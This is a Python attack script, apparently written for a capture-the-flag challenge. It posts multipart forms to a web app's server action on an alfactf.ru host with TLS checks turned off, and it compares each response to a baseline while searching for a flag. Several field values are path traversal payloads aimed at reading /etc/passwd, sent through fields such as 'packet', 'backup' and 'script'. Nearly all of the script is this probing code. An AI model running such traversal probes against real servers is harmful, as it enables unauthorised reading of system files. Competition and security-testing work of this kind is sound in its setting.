#!/usr/bin/env python3
"""
Try MPA action with form fields the action might consume:
- packet, workOrder, terminal, restoreScript, backup, etc.
Also test path traversal in field values.
"""
import urllib.request, urllib.error, ssl, json, http.cookiejar

URL = "https://funicular-gm2cxozn.alfactf.ru/"
ACTION_ID = "40c6382106bb726484f31b3ebc21b7476819a1cccf"

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE


def req(method, url, headers=None, body=None, jar=None):
    opener = urllib.request.build_opener(
        urllib.request.HTTPSHandler(context=ctx),
        urllib.request.HTTPCookieProcessor(jar) if jar else urllib.request.BaseHandler(),
    )
    r = urllib.request.Request(url, data=body, method=method, headers=headers or {})
    try:
        with opener.open(r, timeout=30) as resp:
            return resp.status, dict(resp.headers), resp.read()
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), e.read()


def multipart(fields):
    boundary = "----X1234ABC"
    parts = []
    for k, v in fields:
        parts.append(f"--{boundary}\r\n".encode())
        parts.append(f'Content-Disposition: form-data; name="{k}"\r\n\r\n'.encode())
        parts.append(v.encode() if isinstance(v, str) else v)
        parts.append(b"\r\n")
    parts.append(f"--{boundary}--\r\n".encode())
    return boundary, b"".join(parts)


def find_diff_to_baseline(baseline, candidate):
    """Find the FIRST byte index where they differ."""
    for i in range(min(len(baseline), len(candidate))):
        if baseline[i] != candidate[i]:
            return i
    if len(baseline) != len(candidate):
        return min(len(baseline), len(candidate))
    return None


jar = http.cookiejar.CookieJar()
# Baseline GET
_, _, baseline = req("GET", URL, jar=jar)
print("baseline len", len(baseline))

# Try variations
field_sets = [
    [("packet", "south-line.2026-03-27")],
    [("packet", "south-line.2026-03-27"), ("workOrder", "WO-17-04")],
    [("packet", "south-line.2026-03-27"), ("workOrder", "WO-17-04"), ("terminal", "ОП-3")],
    [("packet", "../../../../etc/passwd")],
    [("backup", "south-line.2026-03-27")],
    [("backup", "../../../etc/passwd")],
    [("script", "restore.sh")],
    [("script", "../../../etc/passwd")],
    [("packet", "south-line.2026-03-27.zip")],
    [("packet", "south-line.2026-03-27"), ("confirm", "yes")],
    [("packet", "south-line.2026-03-27"), ("confirm", "true")],
    [("operation", "restore"), ("packet", "south-line.2026-03-27")],
]

for fs in field_sets:
    boundary, body = multipart([(f"$ACTION_ID_{ACTION_ID}", "")] + fs)
    s, h, d = req("POST", URL, {"Content-Type": f"multipart/form-data; boundary={boundary}"}, body, jar=jar)
    diff_idx = find_diff_to_baseline(baseline, d)
    print(f"\nfields={fs}")
    print(f"  status={s} len={len(d)} first_diff={diff_idx}")
    if diff_idx is not None:
        # Show region around diff
        start = max(0, diff_idx - 80)
        end = diff_idx + 200
        print(f"  diff: BL={baseline[start:end].decode('utf-8','replace')!r}")
        print(f"        CD={d[start:end].decode('utf-8','replace')!r}")
    if b"alfa{" in d:
        i = d.find(b"alfa{")
        print(f"  *** FLAG found *** {d[i:i+200]}")
